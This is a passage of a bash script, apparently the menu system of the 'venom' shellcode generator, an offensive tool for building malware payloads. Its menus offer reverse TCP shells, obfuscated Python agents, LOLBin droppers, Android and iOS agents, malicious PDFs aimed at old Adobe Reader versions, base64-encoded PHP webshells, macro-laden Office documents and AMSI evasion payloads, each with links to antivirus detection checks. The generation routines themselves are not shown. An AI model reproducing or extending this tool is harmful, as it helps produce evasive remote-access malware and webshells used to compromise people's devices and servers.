    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
    SHELLCODE FORMAT   : PYTHON
    AGENT EXTENSION    : PY
    AGENT EXECUTION    : python agent.py
    DETECTION RATIO    : https://goo.gl/s5WqYS

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris
    SHELLCODE FORMAT   : JAVA|PSH
    AGENT EXTENSION    : JAR
    AGENT EXECUTION    : http://$IP
    DETECTION RATIO    : https://goo.gl/aEdLfD

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
    SHELLCODE FORMAT   : PYTHON|PSH
    AGENT EXTENSION    : PY|BAT
    AGENT EXECUTION    : python agent.py | press to exec (bat)
    DETECTION RATIO    : https://goo.gl/vYLF8x

    AGENT Nº4:
    ──────────
    TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
    SHELLCODE FORMAT   : PYTHON (uuid obfuscation)
    AGENT EXTENSION    : PY
    AGENT EXECUTION    : python agent.py
    DETECTION RATIO    : https://goo.gl/nz8Hmr

    AGENT Nº5
    ─────────
    TARGET SYSTEMS     : Windows|Linux|OSx
    DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
    LOLBin             : Powershell|bitsadmin|Wget (DownloadFile)
    DROPPER EXTENSION  : EXE|BAT (obfuscation=on)
    AGENT EXTENSION    : PY

    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode17 ;;
2) sh_shellcode18 ;;
3) sh_shellcode19 ;;
4) sh_shellcode26 ;;
5) sh_shellcode27 ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_multi_menu ;;
esac
}



# -----------------
# ANDRROID|IOS MENU
# -----------------
sh_android_menu () {
echo "${BlueF}[☠]${white} Loading ${YellowF}[Android|IOS]${white} agents .."${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Android
    SHELLCODE FORMAT   : DALVIK
    AGENT EXTENSION    : APK
    AGENT EXECUTION    : Android appl install
    DETECTION RATIO    : https://goo.gl/dy6bkF

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : IOS
    SHELLCODE FORMAT   : MACHO
    AGENT EXTENSION    : MACHO
    EXECUTE IN IOS     : chmod a+x agent.macho && ldid -S agent.macho
    AGENT EXECUTION    : sudo ./agent.macho
    DETECTION RATIO    : https://goo.gl/AhuyGs

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : Android
    SHELLCODE FORMAT   : Android ARM
    AGENT EXTENSION    : PDF
    AGENT EXECUTION    : agent.pdf (double clique)
    DETECTION RATIO    : https://goo.gl/Empty
    AFFECTED VERSIONS  : Adobe Reader versions less than 11.2.0


    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode21 ;;
2) sh_macho ;;
3) sh_android_pdf ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_android_menu ;;
esac
}



# -------------
# WEBSHELL MENU
# -------------
sh_webshell_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[webshell]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Webservers|apache2
    SHELLCODE FORMAT   : PHP
    AGENT EXTENSION    : PHP
    AGENT EXECUTION    : http://$IP/agent.php
    DETECTION RATIO    : https://goo.gl/atfgWM

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Webservers|apache2
    SHELLCODE FORMAT   : PHP (base64)
    AGENT EXTENSION    : PHP
    AGENT EXECUTION    : http://$IP/agent.php
    DETECTION RATIO    : https://goo.gl/mq5QD8

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : apache2 (Linux-Kali)
    SHELLCODE FORMAT   : PHP (base64)
    AGENT EXTENSION    : PHP + SH (unix_exploit)
    AGENT EXECUTION    : http://$IP/trigger.sh
    DETECTION RATIO    : https://goo.gl/wGgZtC


    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
read choice
case $choice in
1) sh_shellcode16 ;;
2) sh_webshellbase ;;
3) sh_webshellunix ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_webshell_menu ;;
esac
}



# -------------------
# MICOSOFT OFICE MENU
# -------------------
sh_world () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Office word]${white} agents ..${Reset};
sleep 2
# module description
cat << !


    AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Windows|OSx
    SHELLCODE FORMAT   : C|PYTHON
    AGENT EXTENSION    : DOCM
    AGENT EXECUTION    : press to exec (docm)
    DETECTION RATIO    : https://goo.gl/xcFKv8

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PYTHON
    AGENT EXTENSION    : PPSX
    AGENT EXECUTION    : press to exec (ppsx)
    DETECTION RATIO    : https://goo.gl/r23dKW

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : RTF
    AGENT EXECUTION    : http://$IP:8080/doc | press to exec (rtf)
    DETECTION RATIO    : https://goo.gl/fUqWA4


    ╔═════════════════════════════════════════════════════════════╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚═════════════════════════════════════════════════════════════╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_world23 ;;
2) sh_world24 ;;
3) sh_world25 ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_world ;;
esac
}




# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
sh_menu () {
echo "main menu" > /dev/null 2>&1
}

# Loop forever
while :
do
clear && echo ${BlueF}
cat << !
            __    _ ______  ____   _  _____  ____    __
           \  \  //|   ___||    \ | |/     \|    \  /  |
            \  \// |   ___||     \| ||     ||     \/   |
             \__/  |______||__/\____|\_____/|__/\__/|__|V$ver
!
echo "       ${BlueF}USER:${YellowF}$user ${BlueF}ENV:${YellowF}$EnV ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${BlueF}
cat << !
    ╔═════════════════════════════════════════════════════════════╗
    ║   1 - Unix based payloads                                   ║
    ║   2 - Windows-OS payloads                                   ║
    ║   3 - Multi-OS payloads                                     ║
    ║   4 - Android|IOS payloads                                  ║
    ║   5 - Webserver payloads                                    ║
    ║   6 - Microsoft office payloads                             ║
    ║   7 - System built-in shells                                ║
    ║   8 - Amsi Evasion Payloads                                 ║
    ║                                                             ║
    ║   E - Exit Shellcode Generator                              ║
    ╚═════════════════════════════════════════════════════════════╣
!
echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2020${BlueF} ╝"

echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Categorie number:${Reset}
read choice
case $choice in
1) sh_unix_menu ;;
2) sh_microsoft_menu ;;
3) sh_multi_menu ;;
4) sh_android_menu ;;
5) sh_webshell_menu ;;
6) sh_world ;;
7) sh_buildin ;;
8) sh_ninja ;;
e|E) sh_exit ;;
*) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2 ;;
esac
done

